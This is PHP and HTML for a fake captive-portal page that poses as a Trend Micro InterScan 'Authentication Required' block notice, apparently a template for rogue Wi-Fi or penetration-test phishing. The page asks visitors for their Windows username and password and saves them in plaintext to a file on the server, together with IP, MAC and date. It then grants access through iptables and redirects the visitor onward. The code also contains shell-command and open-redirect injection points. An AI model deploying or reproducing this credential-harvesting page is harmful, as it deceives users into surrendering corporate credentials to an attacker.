<style type="text/css">
<!--
BODY, TD, TH, P, DIV, SPAN, LI, UL, OL, A, INPUT, SELECT, TEXTAREA {
FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif;
}
a:link {
COLOR: #000066;
text-decoration:underline;
}
a:hover, a:active, a:visited {
COLOR: #000066;
TEXT-DECORATION: none;
}
body { margin:0px; }
.style2 {font-size: 20px}
.style3 {font-size: 13px}
.style4 {font-size: 11px}
.style6 { font-size: 14px;
font-weight: bold;
}
-->
</style>
<style type="text/css">
.topborder {
display: block;
margin-bottom: 0px;
}
.topborder * {
border-style:solid;
border-width:0 1px;
display:block;
font-size:1px;
height:1px;
line-height:1px;
overflow:hidden;
border-color: #9c967c;
background-color: #d4d4d4;
border-width:0 2px;
}
.tb1 { margin:0 8px; background-color: #9c967c;}
.tb2 { margin:0 6px; }
.tb3 { margin:0 5px; }
.tb4 { margin:0 4px; }
.tb5 { margin:0 3px; }
.tb6 { margin:0 2px; }
.tb7 { margin:0 1px; height: 2px; }
.tb8 { margin:0 0px; height: 2px; }
.bb { background-color: #fffeef; }
</style>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>


<?php
// Place in the root of the webserver directory

// Rename these Variables to conform with the target environment 
$server_name = "SERVER_NAME_REPLACE";
$domain_name = "DOMAIN_NAME_REPLACE";
$site_name = "SITE_NAME_REPLACE";
 
// Path to the arp command on the local server
$arp = "/usr/sbin/arp";
 
// The following file is used to keep track of users
$users = "/var/lib/users";
 
// Check if we've been redirected by firewall to here.
// If so redirect to registration address
if ($_SERVER['SERVER_NAME']!="$server_name.$domain_name") {
  header("location:http://$server_name.$domain_name/index.php?add="
    .urlencode($_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']));
  exit;
}
 
// Attempt to get the client's mac address
$mac = shell_exec("$arp -a ".$_SERVER['REMOTE_ADDR']);
preg_match('/..:..:..:..:..:../',$mac , $matches);
@$mac = $matches[0];
if (!isset($mac)) { exit; }
 
$user = $_POST['user'];
 
if (empty($user)) {
//if ($code!="1234") {
  // code doesn’t equal expected value, so display form
  ?>


<body>
<br>
<p style="height: 5px;"></p>
<table align="center" border="0" cellpadding="0" cellspacing="0" width="600">
<tbody>
<tr>
<td colspan="2" nowrap="nowrap"><span style="margin: 0px; font-family: Verdana,Arial,Helvetica,sans-serif; font-size: 20px;">Trend
Micro InterScan Web Security Event</span></td>
</tr>
</tbody>
</table>
<style type="text/css">
<!--
BODY, TD, TH, P, DIV, SPAN, LI, UL, OL, A, INPUT, SELECT, TEXTAREA {
FONT-FAMILY: Verdana, Arial, Helvetica, sans-serif;
}
a:link {
COLOR: #000066;
text-decoration:underline;
}
a:hover, a:active, a:visited {
COLOR: #000066;
TEXT-DECORATION: none;
}
body { margin:0px; }
.style2 {font-size: 20px}
.style3 {font-size: 13px}
.style4 {font-size: 11px}
.style6 { font-size: 14px;
font-weight: bold;
}
-->
</style>
<table align="center" border="0" cellpadding="0" cellspacing="0" width="600">
<tbody>
<tr>
<td colspan="2" style="border-bottom: 1px dotted rgb(0, 0, 0); font-size: 1px;">&nbsp;</td>
</tr>
<tr>
<td>&nbsp; </td>
</tr>
<style type="text/css">
.topborder {
display: block;
margin-bottom: 0px;
}
.topborder * {
border-style:solid;
border-width:0 1px;
display:block;
font-size:1px;
height:1px;
line-height:1px;
overflow:hidden;
border-color: #9c967c;
background-color: #d4d4d4;
border-width:0 2px;
}
.tb1 { margin:0 8px; background-color: #9c967c;}
.tb2 { margin:0 6px; }
.tb3 { margin:0 5px; }
.tb4 { margin:0 4px; }
.tb5 { margin:0 3px; }
.tb6 { margin:0 2px; }
.tb7 { margin:0 1px; height: 2px; }
.tb8 { margin:0 0px; height: 2px; }
.bb { background-color: #fffeef; }
</style>
<tr>
<td colspan="2">
<table align="center" border="0" cellpadding="0" cellspacing="0">
<tbody>

<tr>
<td style="border-style: solid; border-color: rgb(156, 150, 124); border-width: 0px 1px 1px; background-color: rgb(212, 212, 212); padding-bottom: 10px; padding-left: 5px;" class="style6" width="100%">Authentication Required
</td>
</tr>
<tr>
<td colspan="3">
<table style="border-left: 1px solid rgb(156, 150, 124); border-right: 1px solid rgb(156, 150, 124); border-bottom: 0px none;" cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td style="padding: 10px 5px 5px;" bgcolor="#fffeef">
<table border="0" cellpadding="0" cellspacing="0" width="100%">
<tbody>
<tr>
<td colspan="2">
<p class="style3">Access to this
web site was blocked by an IT URL Filtering policy. <br>
<br>
<form method="post">
</p>
</td>
</tr>
<tr>
<td colspan="2" class="style4"><strong>To access the Internet, please logon using your Windows Credentials:</strong></td>
</tr>
<tr>
<td colspan="2" style="font-size: 5px; height: 5px;">&nbsp;</td>
</tr>
<tr>
<td width="77"><span class="style4">Username:</span></td>
<td width="499"><span class="style4"></span><input name="user" type="text"></td>
</tr>
<tr>
<td colspan="2" style="font-size: 5px; height: 5px;">&nbsp;</td>
</tr>
<tr>
<td><span class="style4">Password:</span></td>
<td><input name="pass" type="password"></td>
</tr>
<tr>
<td colspan="2" style="font-size: 5px; height: 5px;">&nbsp;</td>
</tr>
<tr>
<td></td>
<td><input name="submit" value="Submit" type="submit"></td>
</tr>
<tr>
<td colspan="2"><span class="style4"> </span></td>
</tr>
<tr>
<td colspan="2" style="font-size: 5px; height: 5px;">&nbsp;</td>
</tr>
</tbody>
</table>
</form>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr>
<td>
<b class="topborder">
</b>
</td>
</tr>
</tbody>
</table>
</td>
</tr>


<tr>
<td colspan="2" align="right"><span class="style4">Trend Micro InterScan Web Security Virtual
Appliance</span></td>
</tr>
</tbody>
</table>
<p>
</p>
</body>


  <?php
} else {
    enable_address();
}
 
// This function enables the PC on the system by calling iptables, and also saving the
// details in the users file for next time the firewall is reset
 
function enable_address() {
 
    global $user;
    global $pass;
    global $mac;
    global $users;
 

    file_put_contents($users,$_POST['user']."\t".$_POST['pass']."\t".$_SERVER['REMOTE_ADDR']."\t$mac\t".date("m.d.Y")."\n",FILE_APPEND + LOCK_EX);
    
    // Add PC to the firewall
    exec("sudo iptables -I internet 1 -t nat -m mac --mac-source $mac -j RETURN");
    // The following line removes connection tracking for the PC
    // This clears any previous (incorrect) route info for the redirection
    exec("sudo rmtrack ".$_SERVER['REMOTE_ADDR']);

    sleep(1);
    header("location:http://".$_GET['add']);
    exit;
}

// Function to print page header
function print_header() {

  ?>






<head><title>Trend Micro InterScan Web Security Event</title>

</head>


  <?php
}

// Function to print page footer
function print_footer() {
  echo "</body>";
  echo "</html>";

}

?>
